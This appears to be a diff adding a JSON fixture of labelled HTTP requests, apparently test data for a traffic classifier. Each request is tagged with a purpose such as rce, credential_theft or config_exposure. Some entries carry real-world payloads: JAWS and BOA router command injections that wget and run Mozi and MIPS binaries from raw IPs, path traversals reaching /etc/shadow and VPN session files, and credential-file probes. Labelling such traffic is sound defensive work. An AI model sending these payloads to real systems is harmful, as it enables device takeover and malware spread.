+    "ua": "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "FreePBX REST Applications AMI Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/squid-internal-mgr/cachemgr.cgi",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Squid Proxy Cache Manager Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/VERM/VERM_AJAX_functions.php",
+    "ua": "python-requests/2.32.5",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "VERM VoIP Reconnaissance Framework"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/%2577eb%2575i_%2577sma_Http",
+    "ua": "CVE-2023-20198",
+    "body": "<cryptic binary>",
+    "expected_purpose": "rce",
+    "expected_name": "Cisco IOS XE Web UI RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/admin/config.php",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+    "body": "username=root&password=root",
+    "expected_purpose": "credential_theft",
+    "expected_name": "FreePBX Admin Login Brute Force"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/stripe/.env",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Stripe API Key Harvester"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/admin/config.php",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "FreePBX Admin Panel Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/manage/account/login",
+    "ua": "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "GenomeCrawlerd Research Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 (compatible; ModatScanner/1.2; +https://modat.io/)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "ModatScanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/shell?cd+/tmp;rm+-rf+*;wget+http://139.135.45.228:36003/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws",
+    "ua": "Hello, world",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "JAWS Web Server Shell Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/boaform/adminformLogout//boaform/admin/formPing6",
+    "ua": "Mozilla/5.0",
+    "body": "pingAddr=%60cd+%2Ftmp%3Bwget+http%3A%2F%2F31.56.209.220%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+sassythesasquach%60&wanif=65535&go=+Ping&submit-url=%2Fping6.asp&postSecurityFlag=21401",
+    "expected_purpose": "rce",
+    "expected_name": "BOA Router Ping Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2BCSCOE%2B/portal_inc.lua",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Cisco ASA/FTD Path Traversal"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "Fortinet FortiGate SSL-VPN Path Traversal"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "//mbilling/",
+    "ua": "python-requests/2.31.0",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "MagnusBilling VoIP RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/vpnsvc/connect.cgi",
+    "ua": "",
+    "body": "<cryptic binary>",
+    "expected_purpose": "credential_theft",
+    "expected_name": "Pulse Secure SSL-VPN Connect Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/___proxy_subdomain_whm/login/",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "cPanel/WHM Admin Brute Force"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/showLogin.cc",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "SolarWinds Orion Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wsman",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "protocol_probe",
+    "expected_name": "WinRM / WS-Management Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/logon/LogonPoint/tmindex.html",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Citrix Gateway / StoreFront Discovery"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.remote-sync.json",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": "IDE / Remote Sync Credential Exposure"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/query?q=SHOW+DIAGNOSTICS",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "InfluxDB Diagnostic Query Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/v1/completions",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "AI/LLM API Endpoint Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/?format=json&showTrafficStats=yes",
+    "ua": "Mozilla/5.0 (PMTA-Auto)",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "PowerMTA Admin Panel Probe"
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/a2billing/admin/Public/index.php",
+    "ua": "curl/7.29.0",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 zgrab/0.x",
+    "body": "",
+    "expected_purpose": "basic_probe",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/.htpasswd",
+    "ua": "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "body": "",
+    "expected_purpose": "config_exposure",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/application/login",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "synthetic",
+    "method": "POST",
+    "path": "/pool",
+    "ua": "genericminer",
+    "body": "{\"method\": \"login\"}",
+    "expected_purpose": "crypto_mining",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/goform/formWsc",
+    "ua": "Go-http-client/1.1",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "synthetic",
+    "method": "POST",
+    "path": "/gate.php",
+    "ua": "",
+    "body": "x=|'|'|cmd",
+    "expected_purpose": "malware_comm",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "<cryptic binary>",
+    "path": "<cryptic binary>",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/../../../../etc/shadow",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "body": "",
+    "expected_purpose": "path_traversal",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "synthetic",
+    "method": "\u0016\u0003\u0001",
+    "path": "/",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "protocol_probe",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "http://dvtrack.custonews.com/ajax/ip.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/sitecore/shell/sitecore.version.xml",
+    "ua": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/robots.txt",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/dvOlm660X2XRoyE",
+    "ua": "python-requests/2.28.1",
+    "body": "",
+    "expected_purpose": "resource_discovery",
+    "expected_name": null
+  },
+  {
+    "type": "heuristic",
+    "source": "db",
+    "method": "GET",
+    "path": "/idexpert/",
+    "ua": "Mozilla/5.0 (Linux; Android 11; Mi 9 Transparent Edition; Build/RD1B.230516.64) AppleWebKit/537.36 (KHTML",
+    "body": "",
+    "expected_purpose": "unknown",
+    "expected_name": null
+  }
+]
